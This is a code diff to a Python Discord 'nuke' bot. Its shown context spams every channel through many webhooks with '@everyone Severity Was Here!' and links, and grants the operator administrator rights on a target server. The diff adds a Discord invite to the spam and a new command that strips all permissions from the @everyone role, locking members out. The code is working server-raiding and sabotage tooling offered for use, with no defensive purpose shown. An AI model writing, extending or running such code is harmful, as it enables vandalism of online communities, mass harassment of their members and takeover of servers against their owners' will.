@@ -84,7 +84,7 @@ async def nuke(ctx):
         for _ in range(num_webhooks):
             webhook = await channel.create_webhook(name=f"Severity{_}") 
             for _ in range(5):
-                await webhook.send(f"@everyone **Severity Was Here!** https://guns.lol/hooked/")       
+                await webhook.send(f"@everyone **Severity Was Here!** https://guns.lol/hooked/ , discord.gg/obscuralua")       
                 await ctx.send("Nuking the server...")  
 
 @bot.event
@@ -217,6 +217,19 @@ async def giveme(ctx, server_id: int):
             await ctx.send("Server not found.")
     except Exception as e:
         print(Fore.RED + f"Error granting administrator permissions: {e}")
+        await ctx.send("An error occurred while processing the command.")
+
+@bot.command()
+async def removegive(ctx):
+    """
+    Remove all permissions from the @everyone role.
+    """
+    try:
+        everyone_role = ctx.guild.default_role
+        await everyone_role.edit(permissions=discord.Permissions.none())
+        await ctx.send("All permissions have been removed from the @everyone role.")
+    except Exception as e:
+        print(Fore.RED + f"Error removing permissions: {e}")
         await ctx.send("An error occurred while processing the command.")
 
 bot.run(token)
